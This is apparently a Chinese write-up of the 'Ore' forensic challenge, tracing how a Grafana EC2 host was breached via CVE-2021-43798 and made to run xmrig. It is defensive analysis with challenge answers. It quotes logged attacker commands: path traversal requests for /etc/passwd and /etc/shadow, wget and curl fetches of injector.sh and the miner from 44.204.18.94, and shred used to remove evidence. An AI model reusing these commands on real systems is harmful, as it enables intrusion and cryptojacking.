# Ore

:::info Sherlock Scenario

One of our technical partners are currently managing our AWS infrastructure. We requested the deployment of some technology into the cloud. The solution proposed was an EC2 instance hosting the Grafana application. Not too long after the EC2 was deployed the CPU usage ended up sitting at a continuous 98%+ for a process named "xmrig". Important Information Our organisation's office public facing IP is 86.5.206.121, upon the deployment of the application we carried out some basic vulnerability testing and maintenance.

我们的技术合作伙伴目前正在管理我们的 AWS 基础设施。我们请求将某些技术部署到云中。所提出的解决方案是托管 Grafana 应用的一个 EC2 实例。在 EC2 部署后不久，CPU 使用率就持续达到了 98% 以上，一个名为 "xmrig" 的进程导致。重要信息：我们组织办公室的公网 IP 是 86.5.206.121，在部署应用后，我们进行了一些基本的漏洞测试和维护。

:::

## 题目数据

[ore.zip](./ore.zip)

## 题目附件讲解

经过分析，本附件主要提供了两个开源项目的文件

- [grafana](https://github.com/grafana/grafana)
- [Linux-CatScale](https://github.com/WithSecureLabs/LinuxCatScale)

`grafana` 的文件位于 `.\usr\share\grafana` 文件夹内，有以下文件

```plaintext
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----          2022/11/24    23:53                .cache
d----          2022/11/24    23:53                .config
d----          2022/11/24    23:53                .gnupg
d----          2022/11/24    23:53                .local
d----          2022/11/24    23:53                bin
d----          2022/11/24    23:53                conf
d----          2022/11/24    23:53                data
d----          2022/11/24    23:53                plugins-bundled
d----          2022/11/24    23:53                public
d----          2022/11/24    23:53                scripts
-----          2022/11/24    23:53           3348 .bash_history
-----          2022/11/24    23:53             66 .selected_editor
-----          2022/11/24    23:53           8809 .viminfo
-----          2022/11/24    23:53              5 VERSION
```

```plaintext title="文件夹结构树"
D:.
├─.cache - 缓存
├─.config
│  └─lxc - lxc 配置文件
├─.gnupg - gnupg 配置文件
│  └─private-keys-v1.d
├─.local
│  └─share
│      └─nano
├─bin - grafana 二进制程序
├─conf - grafana 配置文件
│  └─provisioning - 各个组件的配置文件
│      ├─access-control
│      ├─dashboards
│      ├─datasources
│      ├─notifiers
│      └─plugins
├─data - grafana 数据存放目录
│  ├─csv
│  ├─log - grafana 日志目录
│  ├─plugins
│  └─png
├─plugins-bundled - 插件目录
│  └─internal
│      └─input-datasource
│          └─img
├─public - grafana 服务端 web 相关文件
└─scripts - grafana 启动脚本
```

`Linux-CatScale` 的文件位于 `catscale_ip-172-31-13-147-20221124-1501.tar.gz` 压缩包内，解压后得到

```plaintext
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----          2022/11/24    23:01                Docker
d----          2022/11/24    23:02                Logs
d----          2022/11/24    23:08                Misc
d----          2022/11/24    23:07                Persistence
d----          2022/11/24    23:01                Podman
d----          2022/11/24    23:07                Process_and_Network
d----          2022/11/24    23:07                System_Info
d----          2022/11/24    23:01                User_Files
d----          2022/11/24    23:01                Virsh
-a---          2022/11/24    23:07           1804 ip-172-31-13-147-20221124-1501-console-error-log.txt
```

```plaintext title="文件夹结构树"
D:.
├─Docker - docker 相关信息
├─Logs - `/var/log` 目录下的日志文件
├─Misc - 其他目录下的日志信息
├─Persistence - 涉及到持久化攻击的相关日志
├─Podman - podman 相关信息
├─Process_and_Network - 进程与网络
├─System_Info - 系统信息
├─User_Files - 用户的文件
└─Virsh - Virsh kvm 相关信息
```

由于 `Linux-CatScale` 会对一些目录下的文件进行压缩处理，所以开始处理之前先对每个文件夹下的压缩文件进行解压缩处理

## Task 1

> 哪个 CVE 导致了 EC2 的初始妥协？

在 `.\grafana\data\log\grafana.log.2022-11-18.001` 文件中，发现以下记录

```plaintext title=".\grafana\data\log\grafana.log.2022-11-18.001"
t=2022-11-17T14:40:55+0000 lvl=info msg="Request Completed" logger=context userId=1 orgId=1 uname=admin method=GET path=/api/live/ws status=0 remote_addr=89.247.167.247 time_ms=1 size=0 referer=
```

借由关键词搜索，可以确定是 grafana 的漏洞，漏洞编号

```plaintext title="Answer"
CVE-2021-43798
```

## Task 2

> 请详细说明威胁行为者（TA）用于针对我们组织的所有恶意 IP 地址。

这里聚焦于 `grafana` 的日志文件进行分析

:::note 注意办公室的公网 ip 地址

需要注意的是，背景信息里面已经提供了办公室的公网 IP，应该在恶意名单内去除这个 ip 地址

```plaintext
86.5.206.121
```

:::

首先，先使用 python 脚本筛选一下 web 访问的路径

```python
for index in range(18, 25):
    with open("./grafana.log.2022-11-{}.001".format(index), "r") as f:
        log_data = f.read()
    log_data = log_data.split("\n")
    for i in log_data:
        if "86.5.206.121" not in i and "remote_addr" in i and "Request Completed" in i:
            info_1 = i.split('"')
            info_2 = [i for i in info_1[2].split("") if i.startswith(("path","remote_addr"))]
            if info_2[0] in ["path=/", "path=/login", "path=/api/search"]:
                continue
            print(info_1[1], " ".join(info_2))
```

<details>

<summary> 脚本输出的结果 </summary>

```plaintext
Request Completed path=/ remote_addr=89.247.167.247
Request Completed path=/api/user/password/reset remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/etc/passwd remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/api/live/ws remote_addr=89.247.167.247
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/grafana.ini remote_addr=89.247.167.247
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/ remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/ remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=86.31.99.194
Request Completed path=/login remote_addr=86.31.99.194
Request Completed path=/login remote_addr=85.255.236.29
Request Completed path=/login remote_addr=213.205.198.177
Request Completed path=/login remote_addr=86.24.61.7
Request Completed path=/login remote_addr=92.40.168.226
Request Completed path=/login remote_addr=86.24.222.206
Request Completed path=/login remote_addr=62.254.9.100
Request Completed path=/login remote_addr=87.80.124.243
Request Completed path=/login remote_addr=45.133.172.63
Request Completed path=/login remote_addr=188.241.82.31
Request Completed path=/login remote_addr=188.241.82.31
Request Completed path=/login remote_addr=212.102.35.14
Request Completed path=/login remote_addr=212.102.35.14
Request Completed path=/login remote_addr=181.214.218.45
Request Completed path=/login remote_addr=181.214.218.45
Request Completed path=/login remote_addr=212.102.36.3
Request Completed path=/login remote_addr=156.146.60.29
Request Completed path=/login remote_addr=156.146.60.29
Request Completed path=/login remote_addr=216.24.213.40
Request Completed path=/login remote_addr=194.32.122.58
Request Completed path=/ remote_addr=71.6.232.20
Request Completed path=/ remote_addr=193.118.53.210
Request Completed path=/login remote_addr=193.118.53.210
Request Completed path=/ remote_addr=198.235.24.155
Request Completed path=/login remote_addr=198.235.24.155
Request Completed path=/login remote_addr=78.146.160.14
Request Completed path=/ remote_addr=205.210.31.132
Request Completed path=/ remote_addr=205.210.31.51
Request Completed path=/login remote_addr=205.210.31.51
Request Completed path=/login remote_addr=44.192.62.21
Request Completed path=/login remote_addr=89.247.167.246
Request Completed path=/login remote_addr=89.247.167.246
Request Completed path=/ remote_addr=89.247.167.246
Request Completed path=/api/live/ws remote_addr=89.247.167.246
Request Completed path=/avatar/46d229b033af06a191ff2267bca9ae56 remote_addr=89.247.167.246
Request Completed path=/api/dashboards/home remote_addr=89.247.167.246
Request Completed path=/api/search remote_addr=89.247.167.246
Request Completed path=/api/plugins remote_addr=89.247.167.246
Request Completed path=/api/search remote_addr=89.247.167.246
Request Completed path=/api/search remote_addr=89.247.167.246
Request Completed path=/api/search remote_addr=89.247.167.246
Request Completed path=/api/search remote_addr=89.247.167.246
Request Completed path=/api/frontend-metrics remote_addr=89.247.167.246
Request Completed path=/login remote_addr=87.80.124.243
Request Completed path=/ remote_addr=95.181.232.32
Request Completed path=/login remote_addr=95.181.232.32
Request Completed path=/ remote_addr=95.181.232.32
Request Completed path=/ remote_addr=95.181.232.32
Request Completed path=
Request Completed path=/public/plugins/alertlist/../etc/passwd remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../etc/passwd remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../etc/passwd remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../etc/passwd remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../etc/passwd remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../etc/passwd remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../etc/shadow remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/sample.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/config/sample.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/sample.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/template.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/default.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32
Request Completed path=/login remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/sample.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/default.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini remote_addr=95.181.232.32
Request Completed path=/public/plugins/alertlist/../../../../../../../../etc/passwd remote_addr=195.80.150.137
Request Completed path=/ remote_addr=195.80.150.137
Request Completed path=/login remote_addr=195.80.150.137
Request Completed path=/login remote_addr=195.80.150.137
Request Completed path=/ remote_addr=195.80.150.137
Request Completed path=/avatar/46d229b033af06a191ff2267bca9ae56 remote_addr=195.80.150.137
Request Completed path=/api/live/ws remote_addr=195.80.150.137
Request Completed path=/api/dashboards/home remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
Request Completed path=/api/plugins remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
Request Completed path=/api/live/list remote_addr=195.80.150.137
Request Completed path=/api/frontend-metrics remote_addr=195.80.150.137
Request Completed path=/api/users/search remote_addr=195.80.150.137
Request Completed path=/avatar/7948431d6e0557fd0c57d91a7cd50cad remote_addr=195.80.150.137
Request Completed path=/api/dashboards/tags remote_addr=195.80.150.137
Request Completed path=/api/search/sorting remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
Request Completed path=/api/search remote_addr=195.80.150.137
```

经过筛选，可以得到 ip 数据的集合

```plaintext
89.247.167.247     11
86.24.61.7         14
86.31.99.194       2
85.255.236.29      1
213.205.198.177    1
92.40.168.226      1
86.24.222.206      1
62.254.9.100       1
87.80.124.243      2
45.133.172.63      1
188.241.82.31      2
212.102.35.14      2
181.214.218.45     2
212.102.36.3       1
156.146.60.29      2
216.24.213.40      1
194.32.122.58      1
71.6.232.20        1
193.118.53.210     2
198.235.24.155     2
78.146.160.14      1
205.210.31.132     1
205.210.31.51      2
44.192.62.21       1
89.247.167.246     13
95.181.232.32      25
195.80.150.137     22
```

</details>

再使用脚本，对登陆失败的记录进行筛选

```python
ips = {}

for index in range(18, 25):
    with open("./grafana.log.2022-11-{}.001".format(index), "r") as f:
        log_data = f.read()
    log_data = log_data.split("\n")
    for i in log_data:
        if "86.5.206.121" not in i and "remote_addr" in i and "Invalid username or password" in i:
            info_1 = i.split('"')
            info_2 = [i for i in info_1[2].split("") if i.startswith(("remote_addr"))]
            print(info_1[1], " ".join(info_2))
            ip = [i for i in i.split("") if i.startswith(("remote_addr"))][0].split("=")[1]
            if ip in ips.keys():
                ips[ip] += 1
            else:
                ips[ip] = 1

for i in ips.keys():
    print(str(i).ljust(18," "), ips[i])
```

得到以下 ip 的集合

```plaintext
86.24.61.7         11
86.31.99.194       1
95.181.232.32      1
```

同时，对 `syslog` 文件进行分析，查找其中可能存在的攻击行为，发现以下 ip

```plaintext
44.204.18.94
```

最终整合上面分析出来的信息，得到最终答案

```plaintext title="Answer"
44.204.18.94,95.181.232.32,195.80.150.137
```

## Task 3

> TA 使用哪个账户进行身份验证以访问主机操作系统？

将 `.\catscale_out\Logs\ip-172-31-13-147-20221124-1501-var-log.tar.gz` 文件进行解压缩，在其中找到 `auth.log` 这个文件，其中所记录的是系统的鉴权日志，在 sshd 部分就可以看到相关鉴权日志

```plaintext title="auth.log"
Nov 23 11:17:18 ip-172-31-60-25 sshd[6105]: Accepted password for grafana from 195.80.150.137 port 52172 ssh2"
```

```plaintext title="Answer"
grafana
```

## Task 4

> TA 修改了哪个文件以提升权限并以 "root" 身份运行挖矿服务？

查看 `Persistence\ip-172-31-13-147-20221124-1501-cron-tab-list.txt` 文件，得到以下信息

```bash
30 8 * * * /opt/automation/updater.sh
ENDOFUSERCRON
ubuntu
no crontab for ubuntu
ENDOFUSERCRON
grafana
no crontab for grafana
ENDOFUSERCRON
itadmin-forela
no crontab for itadmin-forela
ENDOFUSERCRON
```

```plaintext title="Answer"
/opt/automation/updater.sh
```

## Task 5

> TA 使用哪个程序下载了 injector.sh 脚本？

```bash
┌─[randark@parrot]─[~/tmp/var/log]
└──╼ $ cat syslog | grep "injector.sh"
Nov 24 08:30:01 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T08:30:01.467399000Z"/><EventRecordID>75097</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 08:30:01.467</Data><Data Name="ProcessGuid">{c9eb4a87-2b89-637f-700c-0807f5550000}</Data><Data Name="ProcessId">3372</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/root</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">64</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-2b89-637f-4894-b7e93f560000}</Data><Data Name="ParentProcessId">3371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:55:35 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:55:35.396996000Z"/><EventRecordID>76910</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:55:35.401</Data><Data Name="ProcessGuid">{c9eb4a87-3f97-637f-70dc-b5d3e3550000}</Data><Data Name="ProcessId">3992</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-3f97-637f-4864-74f766550000}</Data><Data Name="ParentProcessId">3991</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.851002000Z"/><EventRecordID>76943</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.855</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-70ec-fbf465550000}</Data><Data Name="ProcessId">4001</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.863982000Z"/><EventRecordID>76945</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.869</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-70ec-fbf465550000}</Data><Data Name="ProcessId">4001</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="TargetFilename">/opt/automation/injector.sh</Data><Data Name="CreationUtcTime">2022-11-24 09:59:47.869</Data><Data Name="User">root</Data></EventData></Event>
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.867270000Z"/><EventRecordID>76947</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.872</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-e091-5b045a550000}</Data><Data Name="ProcessId">4002</Data><Data Name="Image">/bin/chmod</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">chmod +x injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.869152000Z"/><EventRecordID>76949</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.874</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-086e-c8d5d7550000}</Data><Data Name="ProcessId">4003</Data><Data Name="Image">/usr/bin/sudo</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">sudo ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.877825000Z"/><EventRecordID>76953</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.882</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ProcessId">4004</Data><Data Name="Image">/bin/bash</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">/bin/bash ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-086e-c8d5d7550000}</Data><Data Name="ParentProcessId">4003</Data><Data Name="ParentImage">/usr/bin/sudo</Data><Data Name="ParentCommandLine">sudo</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.343163000Z"/><EventRecordID>77196</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.344</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-505f-8d8aca550000}</Data><Data Name="ProcessId">4091</Data><Data Name="Image">/usr/bin/shred</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">shred -u ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
```

定位到

```plaintext
wget http://44.204.18.94:80/injector.sh
```

```plaintext title="Answer"
wget
```

## Task 6

> 最初将加密挖矿二进制文件和配置文件下载到了哪里？

直接以 `/usr/bin/curl` 作为关键词进行定位

```bash
┌─[randark@parrot]─[~/tmp/var/log]
└──╼ $ cat syslog | grep "/usr/bin/curl"
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.882033000Z"/><EventRecordID>76954</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.884</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.924977000Z"/><EventRecordID>76955</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.930</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">172.31.60.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">42234</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">44.204.18.94</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
